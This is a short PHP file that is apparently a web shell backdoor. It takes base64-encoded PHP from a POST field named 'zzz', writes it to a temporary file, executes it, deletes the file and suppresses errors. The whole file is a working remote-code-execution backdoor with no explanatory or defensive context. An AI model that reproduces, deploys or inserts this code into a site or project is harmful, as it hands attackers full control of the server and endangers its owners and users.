<?php 
error_reporting(E_ERROR);set_time_limit(0);
if(isset($_POST['zzz'])){
	$tofile='407.php';
	$a =base64_decode(strtr($_POST['zzz'], '-_,', '+/=')); 
	$a='<?php '.$a.'?>';
	@file_put_contents($tofile,$a);
	require_once('407.php');
	@unlink($tofile);
	exit;

}
?>
